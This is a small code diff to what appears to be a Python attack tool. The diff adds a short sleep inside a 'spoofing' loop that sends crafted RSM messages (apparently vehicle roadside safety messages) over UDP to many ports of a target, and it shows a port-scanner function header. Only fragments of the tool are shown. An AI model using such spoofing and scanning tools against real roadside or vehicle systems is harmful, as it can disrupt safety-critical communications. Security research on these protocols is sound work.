@@ -6,6 +6,7 @@ import asn1tools
 from message.MsgFrame import RSM_MsgFrame
 from message import RSM
 import argparse
+import time
 
 def build_attack_message():
     dir = os.path.abspath(os.path.dirname(os.path.dirname(__file__)))
@@ -140,6 +141,7 @@ def spoofing(target, ports):
             for port in ip_tables:
                 attack_address = (target_ip, port)
                 send_packet(udp_socket, attack_message, attack_address)
+            time.sleep(0.01)
 
 def udp_port_scanner(target_ip='', start_port=1024, end_port=65532):
     open_ports = []
